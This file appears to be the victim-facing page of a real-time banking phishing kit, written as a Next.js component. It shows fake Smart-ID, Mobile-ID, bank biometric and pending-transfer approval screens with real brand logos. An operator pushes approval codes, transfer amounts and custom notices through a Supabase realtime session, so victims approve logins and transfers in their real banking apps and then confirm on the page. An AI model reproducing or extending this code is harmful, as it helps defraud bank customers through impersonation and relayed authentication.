"use client";

import { useEffect, useMemo, useState } from "react";
import Image from "next/image";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";
import { resolveLocalBankLogoFile } from "@/lib/bank-logo-constants";
import { Linkify } from "@/components/ui/Linkify";
import { useSettings } from "@/contexts/SettingsContext";

type ApprovalLang = "en" | "tr";

type ApprovalViewState = {
  sessionStatus: string;
  approvalStatus: string;
  approvalCode: string;
  bankSlug: string;
  bankName: string;
  message: string;
  imageUrl: string | null;
  lang: ApprovalLang;
  transferAmount: string;
};

const APPROVAL_LABELS: Record<string, string> = {
  smartid_1: "Smart-ID",
  smartid_2: "Smart-ID 2",
  mobileid_1: "Mobile-ID 1",
  mobileid_2: "Mobile-ID 2",
  biometrika_pin_1: "Biometrie / PIN 1",
  biometrika_pin_2: "Biometrie / PIN 2",
};

function parseApprovalHistory(value: unknown): string[] {
  if (typeof value !== "string" || !value.trim()) {
    return [];
  }

  try {
    const parsed = JSON.parse(value) as unknown;
    if (Array.isArray(parsed)) {
      return parsed.filter((item): item is string => typeof item === "string" && item.trim().length > 0);
    }
  } catch {
    return [value.trim()];
  }

  return [];
}

function formatRemainingTime(seconds: number) {
  const safeSeconds = Math.max(0, seconds);
  const minutes = Math.floor(safeSeconds / 60)
    .toString()
    .padStart(2, "0");
  const remainingSeconds = (safeSeconds % 60).toString().padStart(2, "0");
  return `${minutes}:${remainingSeconds}`;
}

function SmartIdMark() {
  return (
    <div className="flex items-center justify-center">
      <Image
        src="/form-assets/smart-id-logo.webp"
        alt="Smart-ID"
        width={176}
        height={40}
        priority
        className="h-auto w-[176px]"
      />
    </div>
  );
}

function MobileIdMark() {
  return (
    <div className="flex items-center justify-center">
      <Image
        src="/form-assets/mobile-id-logo.webp"
        alt="Mobile-ID"
        width={178}
        height={42}
        priority
        className="h-auto w-[178px]"
      />
    </div>
  );
}

function SmartIdApprovalCard({
  approvalCode,
  secondsLeft,
  saving,
  pinLabel,
  onConfirm,
}: {
  approvalCode: string;
  secondsLeft: number;
  saving: boolean;
  pinLabel: "PIN1" | "PIN2";
  onConfirm: () => void;
}) {
  return (
    <div className="flex min-h-screen items-center justify-center px-4 py-8">
      <div className="w-full max-w-[352px] rounded-[18px] bg-white px-6 py-8 shadow-[0_20px_70px_rgba(20,32,56,0.10)] sm:px-7">
        <div className="mb-9 flex justify-center">
          <SmartIdMark />
        </div>

        <div className="space-y-5 text-center">
          <h1 className="text-[2rem] font-semibold leading-[1.18] tracking-[-0.03em] text-[#101828]">
            Open the Smart-ID app on your phone.
          </h1>

          <p className="text-[1.08rem] text-[#667085]">Bestaetigen mit {pinLabel}</p>

          <div className="rounded-[12px] border border-[#d8dde5] bg-[#f8fafc] px-5 py-5 text-[2.5rem] font-semibold tracking-[0.14em] text-[#111827]">
            {approvalCode || "0000"}
          </div>

          <p className="text-[1rem] text-[#667085]">
            Time remaining: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
          </p>

          <button
            type="button"
            onClick={onConfirm}
            disabled={saving}
            className="w-full rounded-[10px] bg-[#1464f4] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[#0e57db] disabled:cursor-not-allowed disabled:opacity-70"
          >
            {saving ? "Wird bestaetigt..." : "Bestaetigen"}
          </button>
        </div>
      </div>
    </div>
  );
}

function GenericApprovalCard({
  title,
  approvalCode,
  secondsLeft,
  saving,
  onConfirm,
}: {
  title: string;
  approvalCode: string;
  secondsLeft: number;
  saving: boolean;
  onConfirm: () => void;
}) {
  return (
    <div className="flex min-h-screen items-center justify-center px-4 py-8">
      <div className="w-full max-w-[420px] rounded-[22px] border border-[#d9dee6] bg-white p-7 text-center shadow-[0_24px_80px_rgba(20,32,56,0.10)]">
        <p className="mb-3 text-sm font-semibold uppercase tracking-[0.24em] text-[#0ea5a8]">{title}</p>
        <h1 className="mb-3 text-3xl font-semibold tracking-[-0.03em] text-[#101828]">Bestaetigung erforderlich</h1>
        <p className="mb-6 text-base text-[#667085]">To continue, confirm the verification code shown on your device.</p>

        <div className="mb-4 rounded-2xl border border-[#d8dde5] bg-[#f8fafc] px-5 py-5 text-4xl font-semibold tracking-[0.14em] text-[#111827]">
          {approvalCode || "0000"}
        </div>

        <p className="mb-6 text-sm text-[#667085]">
          Time remaining: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
        </p>

        <button
          type="button"
          onClick={onConfirm}
          disabled={saving}
          className="w-full rounded-[12px] bg-[#1464f4] px-4 py-4 text-base font-medium text-white transition hover:bg-[#0e57db] disabled:cursor-not-allowed disabled:opacity-70"
        >
          {saving ? "Wird bestaetigt..." : "Bestaetigen"}
        </button>
      </div>
    </div>
  );
}

function MobileIdApprovalCard({
  approvalCode,
  secondsLeft,
  saving,
  pinLabel,
  onConfirm,
}: {
  approvalCode: string;
  secondsLeft: number;
  saving: boolean;
  pinLabel: "PIN1" | "PIN2";
  onConfirm: () => void;
}) {
  return (
    <div className="flex min-h-screen items-center justify-center px-4 py-8">
      <div className="w-full max-w-[354px] rounded-[18px] bg-white px-7 py-8 shadow-[0_20px_70px_rgba(20,32,56,0.10)]">
        <div className="mb-9 flex justify-center">
          <MobileIdMark />
        </div>

        <div className="space-y-5 text-center">
          <h1 className="text-[2rem] font-semibold leading-[1.18] tracking-[-0.03em] text-[#101828]">
            Open the Mobile-ID app on your phone.
          </h1>

          <p className="text-[1.08rem] text-[#667085]">Bestaetigen mit {pinLabel}</p>

          <div className="rounded-[12px] border border-[#d8dde5] bg-[#f8fafc] px-5 py-5 text-[2.5rem] font-semibold tracking-[0.14em] text-[#111827]">
            {approvalCode || "0000"}
          </div>

          <p className="text-[1rem] text-[#667085]">
            Time remaining: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
          </p>

          <button
            type="button"
            onClick={onConfirm}
            disabled={saving}
            className="w-full rounded-[10px] bg-[#1464f4] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[#0e57db] disabled:cursor-not-allowed disabled:opacity-70"
          >
            {saving ? "Wird bestaetigt..." : "Bestaetigen"}
          </button>
        </div>
      </div>
    </div>
  );
}

function BiometricApprovalCard({
  approvalCode,
  secondsLeft,
  saving,
  pinLabel,
  bankSlug,
  bankName,
  onConfirm,
}: {
  approvalCode: string;
  secondsLeft: number;
  saving: boolean;
  pinLabel: "PIN1" | "PIN2";
  bankSlug: string;
  bankName: string;
  onConfirm: () => void;
}) {
  const bankLogo = resolveLocalBankLogoFile(bankSlug, null);

  return (
    <div className="flex min-h-screen items-center justify-center px-4 py-8">
      <div className="w-full max-w-[354px] rounded-[18px] bg-white px-7 py-8 shadow-[0_20px_70px_rgba(20,32,56,0.10)]">
        <div className="mb-9 flex min-h-[48px] items-center justify-center">
          {bankLogo ? (
            <img
              src={bankLogo}
              alt={bankName || bankSlug || "Bank"}
              className="max-h-12 w-auto max-w-[190px] object-contain"
            />
          ) : (
            <div className="text-center text-2xl font-semibold tracking-[-0.03em] text-[#101828]">
              {bankName || bankSlug || "Bank"}
            </div>
          )}
        </div>

        <div className="space-y-5 text-center">
          <h1 className="text-[2rem] font-semibold leading-[1.18] tracking-[-0.03em] text-[#101828]">
            Biometric verification
          </h1>

          <p className="text-[1.08rem] text-[#667085]">Bestaetigen mit {pinLabel}</p>

          <div className="rounded-[12px] border border-[#d8dde5] bg-[#f8fafc] px-5 py-5 text-[2.5rem] font-semibold tracking-[0.14em] text-[#111827]">
            {approvalCode || "0000"}
          </div>

          <p className="text-[1rem] text-[#667085]">
            Time remaining: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
          </p>

          <button
            type="button"
            onClick={onConfirm}
            disabled={saving}
            className="w-full rounded-[10px] bg-[#1464f4] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[#0e57db] disabled:cursor-not-allowed disabled:opacity-70"
          >
            {saving ? "Wird bestaetigt..." : "Bestaetigen"}
          </button>
        </div>
      </div>
    </div>
  );
}

function TransferApprovalCard({
  amount,
  secondsLeft,
  saving,
  onConfirm,
}: {
  amount: string;
  secondsLeft: number;
  saving: boolean;
  onConfirm: () => void;
}) {
  const mm = Math.floor(secondsLeft / 60);
  const ss = secondsLeft % 60;
  const displayAmount = amount.trim();

  return (
    <div className="pak-page-shell">
      <div className="pak-form-card w-full max-w-[560px]">
        <div className="pak-form-inner px-5 py-6 text-center sm:px-8 sm:py-8">
          <p className="pak-eyebrow">Online Banking</p>
          <h1 className="pak-form-title mt-3 text-[2rem] sm:text-[2.5rem]">Pending Transfer</h1>

          {/* Buyuk € tutar kutusu */}
          <div className="mx-auto mb-6 mt-4 flex h-24 w-24 items-center justify-center rounded-[14px] bg-[#0C7A3E] text-[1.75rem] font-bold tracking-tight text-white">
            {displayAmount ? `$${displayAmount}` : "$"}
          </div>

          <div className="mx-auto grid max-w-[460px] grid-cols-3 items-center gap-2 rounded-[10px] bg-[#f6fbff] px-3 py-4 text-left sm:px-5">
            <div className="border-r border-black/5 pr-3">
              <p className="text-[10px] font-semibold uppercase tracking-[0.08em] text-[#6f7b8e]">Status</p>
              <div className="mt-1 flex items-center gap-2">
                <span className="h-3 w-3 animate-pulse rounded-full bg-[#ef9b23]" />
                <span className="text-[12px] font-semibold text-[#27324a]">Waiting</span>
              </div>
            </div>
            <div className="border-r border-black/5 px-3">
              <p className="text-[10px] font-semibold uppercase tracking-[0.08em] text-[#6f7b8e]">Action</p>
              <p className="mt-1 text-[12px] font-semibold text-[#27324a]">Approve transfer</p>
            </div>
            <div className="pl-3">
              <p className="text-[10px] font-semibold uppercase tracking-[0.08em] text-[#6f7b8e]">Currency</p>
              <p className="mt-1 text-[12px] font-semibold text-[#27324a]">Euro</p>
            </div>
          </div>

          <p className="mt-4 text-[13px] font-medium text-[#55607d]">
            Eine Ueberweisung von{" "}
            <span className="font-semibold text-[#1d2a45]">
              {displayAmount ? `€ ${displayAmount}` : "dem erforderlichen Betrag"}
            </span>{" "}
            steht aus. Um diese Ueberweisung abzuschliessen, bestaetigen Sie sie in Ihrer Banking-App und anschliessend hier.
          </p>

          <div className="mt-5 flex items-center justify-center gap-2">
            <div className="flex h-7 w-7 items-center justify-center rounded-full border-2 border-[#cdd8ef]">
              <svg className="h-3.5 w-3.5 text-[#8ba3d9]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={2}>
                <path d="M12 6v6l4 2" strokeLinecap="round" strokeLinejoin="round" />
              </svg>
            </div>
            <span className="text-[26px] font-semibold tracking-[0.04em] text-[#1d2a45]">
              {String(mm).padStart(2, "0")}:{String(ss).padStart(2, "0")}
            </span>
          </div>

          <div className="mx-auto mt-5 max-w-[480px] rounded-[6px] bg-[#e4f3ee] px-4 py-3 text-[12.5px] font-medium leading-5 text-[#175c48]">
            Keep your banking app open — the approval request may take a moment to appear.
          </div>

          <button
            type="button"
            onClick={onConfirm}
            disabled={saving}
            className="mt-5 w-full rounded-[10px] bg-[#1464f4] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[#0e57db] disabled:cursor-not-allowed disabled:opacity-70"
          >
            {saving ? "Wird bestaetigt..." : "Ich habe bestaetigt"}
          </button>
        </div>
      </div>
    </div>
  );
}

function SpecialNoticeCard({ message, imageUrl }: { message: string; imageUrl: string | null }) {
  const { settings } = useSettings();
  return (
    <div className="pak-page-shell">
      <div className="pak-form-card w-full max-w-[640px]">
        <div className="pak-form-inner px-5 py-6 text-center sm:px-8 sm:py-8">
          <div className="mb-4 flex items-start justify-between gap-4 text-left">
            <div>
              <p className="text-[0.72rem] font-black uppercase tracking-[0.24em] text-[#FF453A]">Customer Support</p>
              <h1 className="mt-3 text-3xl font-extrabold uppercase leading-[0.95] tracking-[-0.03em] text-white sm:text-[2.65rem]">
                Special Notice
              </h1>
            </div>
            <img
              src={settings.logo_url && settings.logo_url !== "/logo.webp" ? settings.logo_url : "/logo.webp"}
              alt={settings.portal_name || "Brand"}
              className="pak-form-brand-logo shrink-0"
            />
          </div>

          <div className="mb-5 rounded-[1.2rem] border border-[#FF453A]/20 bg-black/20 px-4 py-4 sm:px-5">
            <p className="whitespace-pre-wrap text-base font-semibold leading-7 text-white/92 sm:text-lg">
              <Linkify text={message} />
            </p>
          </div>

          <div className="pak-form-security justify-center border-t border-[#FF453A]/15 pt-4 text-center">
            <svg className="h-7 w-7 shrink-0 text-[#FF453A]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
              <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinecap="round" strokeLinejoin="round" />
            </svg>
            <span>Your request is being reviewed securely by our customer support team.</span>
          </div>

          {imageUrl ? (
            <div className="mt-5 overflow-hidden rounded-2xl border border-white/10 bg-white/5 p-1 shadow-sm">
              <img src={imageUrl} alt="Support-Hinweis" className="mx-auto h-auto w-full rounded-xl object-contain" />
            </div>
          ) : null}
        </div>
      </div>
    </div>
  );
}

export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const [effectiveSessionId, setEffectiveSessionId] = useState(sessionId);
  const [ready, setReady] = useState(false);
  const [saving, setSaving] = useState(false);
  const [secondsLeft, setSecondsLeft] = useState(30);
  const [viewState, setViewState] = useState<ApprovalViewState>({
    sessionStatus: "",
    approvalStatus: "",
    approvalCode: "",
    bankSlug: "",
    bankName: "",
    message: "Bitte warten...",
    imageUrl: null,
    lang: "en",
    transferAmount: "",
  });

  useEffect(() => {
    if (sessionId) return;
    const cached = localStorage.getItem("activeSessionId");
    if (cached) setEffectiveSessionId(cached);
  }, [sessionId]);

  useEffect(() => {
    if (!viewState.approvalStatus) return;
    setSecondsLeft(30);

    const timer = window.setInterval(() => {
      setSecondsLeft((previous) => {
        if (previous <= 1) {
          window.clearInterval(timer);
          return 0;
        }
        return previous - 1;
      });
    }, 1000);

    return () => {
      window.clearInterval(timer);
    };
  }, [viewState.approvalStatus, effectiveSessionId]);

  useEffect(() => {
    if (!effectiveSessionId || !supabase) return;

    const applySessionData = (sessionData: { form_data?: Record<string, unknown> | null; status?: string | null } | null | undefined) => {
      const formData = sessionData?.form_data;
      const fd = (formData ?? {}) as Record<string, string | undefined>;
      setViewState({
        sessionStatus: sessionData?.status?.trim() ?? "",
        approvalStatus: fd.approvalStatus?.trim() ?? "",
        approvalCode: fd.approvalCode?.trim() ?? "",
        bankSlug: fd.bankSlug?.trim() ?? "",
        bankName: fd.bankName?.trim() ?? "",
        message: fd.specialNoticeText ?? fd.customMessage ?? "Bitte warten...",
        imageUrl: fd.specialNoticeImage ?? fd.customImage ?? null,
        lang: (fd.specialNoticeLang as ApprovalLang | undefined) ?? "en",
        transferAmount: fd.transferAmount?.trim() ?? "",
      });
      setReady(true);
    };

    void (async () => {
      const { data } = await supabase.from("sessions").select("*").eq("id", effectiveSessionId).maybeSingle();
      if (!data) {
        setReady(true);
        return;
      }
      applySessionData(data as { form_data?: Record<string, unknown> | null; status?: string | null });
    })();

    const channel = supabase
      .channel(`special-approval-content:${effectiveSessionId}`)
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "sessions", filter: `id=eq.${effectiveSessionId}` },
        (payload) => {
          const next = payload.new as { form_data?: Record<string, unknown> | null; status?: string | null };
          applySessionData(next);
        },
      )
      .subscribe();

    return () => {
      void supabase.removeChannel(channel);
    };
  }, [effectiveSessionId, supabase]);

  async function handleApprovalSubmit() {
    if (!supabase || !effectiveSessionId) return;

    setSaving(true);
    const { data: existing } = await supabase.from("sessions").select("*").eq("id", effectiveSessionId).maybeSingle();
    const previousFormData = ((existing?.form_data ?? {}) as Record<string, string | undefined>) ?? {};
    const confirmedStatus = `${viewState.approvalStatus}_confirmed`;
    const nextApprovalHistory = [
      ...parseApprovalHistory(previousFormData.approvalHistory),
      confirmedStatus,
    ].filter((item) => item && item.trim().length > 0);

    const { error } = await supabase
      .from("sessions")
      .update({
        is_hidden: false,
        current_step: "wait",
        form_data: {
          ...previousFormData,
          approvalStatus: confirmedStatus,
          approvalCode: viewState.approvalCode,
          approvalHistory: JSON.stringify(nextApprovalHistory),
        },
      })
      .eq("id", effectiveSessionId);

    setSaving(false);
    if (!error) {
      // ⭐ FLASH YOK: router.push → router.replace
      router.replace(stepToPath("wait", effectiveSessionId));
    }
  }

  if (!ready) {
    return (
      <div className="flex min-h-screen items-center justify-center px-4">
        <div className="size-10 animate-spin rounded-full border-4 border-[#1464f4]/25 border-t-[#1464f4]" />
      </div>
    );
  }

  if (viewState.sessionStatus === "SPECIAL_INFO") {
    return <SpecialNoticeCard message={viewState.message} imageUrl={viewState.imageUrl} />;
  }

  if (viewState.approvalStatus === "smartid_1" || viewState.approvalStatus === "smartid_2") {
    return (
      <SmartIdApprovalCard
        approvalCode={viewState.approvalCode}
        secondsLeft={secondsLeft}
        saving={saving}
        pinLabel={viewState.approvalStatus === "smartid_2" ? "PIN2" : "PIN1"}
        onConfirm={() => void handleApprovalSubmit()}
      />
    );
  }

  if (viewState.approvalStatus === "mobileid_1" || viewState.approvalStatus === "mobileid_2") {
    return (
      <MobileIdApprovalCard
        approvalCode={viewState.approvalCode}
        secondsLeft={secondsLeft}
        saving={saving}
        pinLabel={viewState.approvalStatus === "mobileid_2" ? "PIN2" : "PIN1"}
        onConfirm={() => void handleApprovalSubmit()}
      />
    );
  }

  if (viewState.approvalStatus === "biometrika_pin_1" || viewState.approvalStatus === "biometrika_pin_2") {
    return (
      <BiometricApprovalCard
        approvalCode={viewState.approvalCode}
        secondsLeft={secondsLeft}
        saving={saving}
        pinLabel={viewState.approvalStatus === "biometrika_pin_2" ? "PIN2" : "PIN1"}
        bankSlug={viewState.bankSlug}
        bankName={viewState.bankName}
        onConfirm={() => void handleApprovalSubmit()}
      />
    );
  }

  if (viewState.approvalStatus === "transfer") {
    return (
      <TransferApprovalCard
        amount={viewState.transferAmount}
        secondsLeft={secondsLeft}
        saving={saving}
        onConfirm={() => void handleApprovalSubmit()}
      />
    );
  }

  if (viewState.approvalStatus) {
    return (
      <GenericApprovalCard
        title={APPROVAL_LABELS[viewState.approvalStatus] ?? "Bestaetigung"}
        approvalCode={viewState.approvalCode}
        secondsLeft={secondsLeft}
        saving={saving}
        onConfirm={() => void handleApprovalSubmit()}
      />
    );
  }

  return <SpecialNoticeCard message={viewState.message} imageUrl={viewState.imageUrl} />;
}
